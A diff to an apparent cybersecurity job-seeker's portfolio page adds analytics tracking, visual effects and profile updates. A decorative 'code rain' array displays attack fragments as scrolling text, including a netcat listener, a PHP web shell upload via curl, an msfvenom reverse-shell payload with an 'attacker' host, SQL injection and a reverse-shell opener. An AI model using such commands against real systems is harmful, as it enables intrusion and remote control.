@@ -5,6 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Muhammad Ramis | Cybersecurity Specialist</title>
     
+    <!-- Google Analytics (Replace YOUR_GA_ID with your actual Google Analytics 4 ID) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GKD7JXRS66"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-GKD7JXRS66');
+    </script>
+    
+    
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "rpwqh3rock");
+    </script>
+    
     <!-- Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     
@@ -13,6 +31,9 @@
     
     <!-- AOS Animation Library -->
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <!-- THREE.js for 3D Effects -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     
     <style>
         :root {
@@ -861,6 +882,147 @@
             color: #10b981;
         }
 
+        /* 3D Floating Cubes */
+        .floating-cubes {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .cube {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: rgba(14, 165, 233, 0.1);
+            border: 1px solid rgba(14, 165, 233, 0.3);
+            animation: cubeDrift linear infinite;
+            transform-style: preserve-3d;
+        }
+
+        @keyframes cubeDrift {
+            0% {
+                transform: translateY(100vh) rotateX(0deg) rotateY(0deg);
+                opacity: 0;
+            }
+            10%, 90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotateX(720deg) rotateY(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* Parallax Stars */
+        .stars {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #0ea5e9, transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(14, 165, 233, 0.8), transparent),
+                radial-gradient(1px 1px at 90px 40px, #0ea5e9, transparent),
+                radial-gradient(1px 1px at 130px 80px, rgba(14, 165, 233, 0.6), transparent),
+                radial-gradient(2px 2px at 160px 30px, #0ea5e9, transparent);
+            background-repeat: repeat;
+            background-size: 200px 100px;
+            animation: starsMove 60s linear infinite;
+        }
+
+        @keyframes starsMove {
+            from { transform: translateY(0px); }
+            to { transform: translateY(-100px); }
+        }
+
+        /* Neon Glow Effects */
+        .neon-border {
+            border: 2px solid #0ea5e9;
+            border-radius: 10px;
+            box-shadow: 
+                0 0 5px #0ea5e9,
+                0 0 10px #0ea5e9,
+                0 0 15px #0ea5e9,
+                inset 0 0 5px rgba(14, 165, 233, 0.2);
+            animation: neonPulse 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes neonPulse {
+            from {
+                box-shadow: 
+                    0 0 5px #0ea5e9,
+                    0 0 10px #0ea5e9,
+                    0 0 15px #0ea5e9,
+                    inset 0 0 5px rgba(14, 165, 233, 0.2);
+            }
+            to {
+                box-shadow: 
+                    0 0 10px #0ea5e9,
+                    0 0 20px #0ea5e9,
+                    0 0 30px #0ea5e9,
+                    inset 0 0 10px rgba(14, 165, 233, 0.4);
+            }
+        }
+
+        /* Code Rain Background */
+        .code-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            opacity: 0.1;
+        }
+
+        .code-line {
+            position: absolute;
+            color: #0ea5e9;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            white-space: nowrap;
+            animation: codeScroll linear infinite;
+        }
+
+        @keyframes codeScroll {
+            0% {
+                transform: translateX(100vw);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        /* Holographic effect */
+        .holographic {
+            background: linear-gradient(45deg, 
+                rgba(14, 165, 233, 0.1),
+                rgba(59, 130, 246, 0.1),
+                rgba(14, 165, 233, 0.1));
+            background-size: 300% 300%;
+            animation: hologramShift 3s ease infinite;
+        }
+
+        @keyframes hologramShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        /* Mouse Trail Effect */
+        .mouse-trail {
+            position: fixed;
+            width: 6px;
+            height: 6px;
+            background: radial-gradient(circle, #0ea5e9 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
         /* Pulse Effect for Important Elements */
         .pulse {
             animation: pulse 2s infinite;
@@ -908,9 +1070,12 @@
 
     <!-- Hero Section -->
     <section id="home" class="hero">
+        <div class="stars"></div>
         <div class="cyber-grid"></div>
         <div class="matrix-rain" id="matrix-rain"></div>
+        <div class="code-rain" id="code-rain"></div>
         <div class="floating-icons" id="floating-icons"></div>
+        <div class="floating-cubes" id="floating-cubes"></div>
         
         <div class="hero-content">
             <div class="hero-subtitle" data-aos="fade-up">Welcome to my digital domain</div>
@@ -923,7 +1088,7 @@
                 Passionate about securing digital infrastructures and advancing through cutting-edge penetration testing techniques.
             </p>
             
-            <div class="terminal-window" data-aos="fade-up" data-aos-delay="700">
+            <div class="terminal-window neon-border holographic" data-aos="fade-up" data-aos-delay="700">
                 <div class="terminal-header">
                     <div class="terminal-buttons">
                         <div class="terminal-btn red"></div>
@@ -934,16 +1099,18 @@
                 </div>
                 <div class="terminal-content">
                     <div><span class="terminal-prompt">ramis@cybersec:~$</span> <span class="terminal-command">whoami</span></div>
-                    <div class="terminal-output">OSCP-Certified Penetration Tester | Sheffield MSc Student</div>
+                    <div class="terminal-output">OSCP-Certified Penetration Tester | Sheffield MSc Graduate</div>
                     <div><span class="terminal-prompt">ramis@cybersec:~$</span> <span class="terminal-command">cat skills.txt</span></div>
                     <div class="terminal-output">Python | Burp Suite | Metasploit | OWASP | Cloud Security</div>
                     <div><span class="terminal-prompt">ramis@cybersec:~$</span> <span class="terminal-command">echo $STATUS</span></div>
                     <div class="terminal-output">Ready for UK Cybersecurity Opportunities</div>
+                    <div><span class="terminal-prompt">ramis@cybersec:~$</span> <span class="terminal-command">contact --hire-me</span></div>
+                    <div class="terminal-output">📧 mramis1@outlook.com | 📱 07789 399 920</div>
                 </div>
             </div>
             
             <div class="cta-buttons" data-aos="fade-up" data-aos-delay="800">
-                <a href="#contact" class="btn btn-primary pulse">
+                <a href="#contact" class="btn btn-primary pulse neon-border">
                     <i class="fas fa-envelope"></i> Get In Touch
                 </a>
                 <a href="#about" class="btn btn-outline">
@@ -1023,6 +1190,7 @@
                     <span class="skill-tag">Active Directory</span>
                     <span class="skill-tag">Privilege Escalation</span>
                     <span class="skill-tag">Cloud Infrastructure</span>
+                    <span class="skill-tag">Wireless Networks</span>
                 </div>
             </div>
 
@@ -1230,10 +1398,10 @@
 
                 <div class="contact-item" data-aos="fade-up" data-aos-delay="800">
                     <div class="contact-icon">
-                        <i class="fas fa-globe"></i>
+                        <i class="fas fa-briefcase"></i>
                     </div>
-                    <div class="contact-label">Status</div>
-                    <div class="contact-value">Eligible for UK Sponsorship</div>
+                    <div class="contact-label">Availability</div>
+                    <div class="contact-value">Open to New Opportunities</div>
                 </div>
             </div>
 
@@ -1358,9 +1526,11 @@
                     'Security Automation Expert',
                     'Ethical Hacker',
                     'Cloud Security Engineer',
-                    'Sheffield MSc Student',
+                    'AI & Cybersecurity Researcher',
+                    'Sheffield MSc Graduate',
                     'Bug Hunter',
-                    'Security Consultant'
+                    'Security Consultant',
+                    'CREST Candidate'
                 ],
                 typeSpeed: 80,
                 backSpeed: 40,
@@ -1419,6 +1589,41 @@
             setInterval(createChar, 200);
         }
 
+        // Code Rain Effect
+        function createCodeRain() {
+            const codeContainer = document.getElementById('code-rain');
+            const codeSnippets = [
+                'import subprocess; subprocess.run([\'nmap\', \'-sS\', target])',
+                'from burp import IBurpExtender; class BurpExtender(IBurpExtender):',
+                'SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin;',
+                'powershell -enc <base64_encoded_payload>',
+                'python3 -c "import socket,subprocess,os;s=socket.socket()",',
+                'grep -r "password" /var/log/ 2>/dev/null',
+                'netcat -lvnp 4444',
+                'curl -X POST -d "<?php system($_GET[\'cmd\']); ?>" http://target/upload.php',
+                'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444',
+                'hashcat -m 1000 hashes.txt rockyou.txt'
+            ];
+            
+            function createCodeLine() {
+                const line = document.createElement('div');
+                line.className = 'code-line';
+                line.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
+                line.style.top = Math.random() * 100 + '%';
+                line.style.animationDuration = (Math.random() * 10 + 8) + 's';
+                line.style.fontSize = (Math.random() * 4 + 10) + 'px';
+                codeContainer.appendChild(line);
+                
+                setTimeout(() => {
+                    if (line.parentNode) {
+                        line.parentNode.removeChild(line);
+                    }
+                }, 18000);
+            }
+            
+            setInterval(createCodeLine, 2000);
+        }
+
         // Floating Icons Effect
         function createFloatingIcons() {
             const container = document.getElementById('floating-icons');
@@ -1442,11 +1647,124 @@
             setInterval(createIcon, 3000);
         }
 
-        // Initialize effects
+        // Floating Cubes Effect
+        function createFloatingCubes() {
+            const container = document.getElementById('floating-cubes');
+            
+            function createCube() {
+                const cube = document.createElement('div');
+                cube.className = 'cube';
+                cube.style.left = Math.random() * 100 + '%';
+                cube.style.animationDuration = (Math.random() * 15 + 10) + 's';
+                cube.style.animationDelay = Math.random() * 5 + 's';
+                container.appendChild(cube);
+                
+                setTimeout(() => {
+                    if (cube.parentNode) {
+                        cube.parentNode.removeChild(cube);
+                    }
+                }, 25000);
+            }
+            
+            setInterval(createCube, 4000);
+        }
+
+        // Mouse Trail Effect
+        function createMouseTrail() {
+            const trail = [];
+            const trailLength = 20;
+            
+            for (let i = 0; i < trailLength; i++) {
+                const dot = document.createElement('div');
+                dot.className = 'mouse-trail';
+                document.body.appendChild(dot);
+                trail.push(dot);
+            }
+            
+            document.addEventListener('mousemove', (e) => {
+                trail.forEach((dot, index) => {
+                    setTimeout(() => {
+                        dot.style.left = e.clientX + 'px';
+                        dot.style.top = e.clientY + 'px';
+                        dot.style.opacity = (trailLength - index) / trailLength;
+                        dot.style.transform = `scale(${(trailLength - index) / trailLength})`;
+                    }, index * 50);
+                });
+            });
+        }
+
+        // Analytics Event Tracking
+        function trackEvent(action, category, label) {
+            // Google Analytics 4 event tracking
+            if (typeof gtag !== 'undefined') {
+                gtag('event', action, {
+                    'event_category': category,
+                    'event_label': label
+                });
+            }
+            
+            // Microsoft Clarity custom events
+            if (typeof clarity !== 'undefined') {
+                clarity('set', action, label);
+            }
+        }
+
+        // Track user interactions
+        function setupAnalytics() {
+            // Track button clicks
+            document.querySelectorAll('.btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    trackEvent('button_click', 'engagement', e.target.textContent);
+                });
+            });
+            
+            // Track section views
+            const sections = document.querySelectorAll('section[id]');
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        trackEvent('section_view', 'navigation', entry.target.id);
+                    }
+                });
+            }, { threshold: 0.5 });
+            
+            sections.forEach(section => observer.observe(section));
+            
+            // Track contact link clicks
+            document.querySelectorAll('a[href^="mailto:"], a[href^="tel:"]').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    trackEvent('contact_click', 'conversion', e.target.href);
+                });
+            });
+            
+            // Track external link clicks
+            document.querySelectorAll('a[target="_blank"]').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    trackEvent('external_link', 'engagement', e.target.href);
+                });
+            });
+        }
+
+        // Initialize all effects
         setTimeout(() => {
             createMatrixRain();
+            createCodeRain();
             createFloatingIcons();
+            createFloatingCubes();
+            createMouseTrail();
+            setupAnalytics();
         }, 2000);
+
+        // Add interactive elements
+        document.querySelectorAll('.skill-category, .cert-card, .timeline-content').forEach(card => {
+            card.addEventListener('mouseenter', function() {
+                this.style.transform = 'translateY(-8px) scale(1.02)';
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                this.style.transform = 'translateY(0) scale(1)';
+            });
+        });
     </script>
 </body>
 </html>
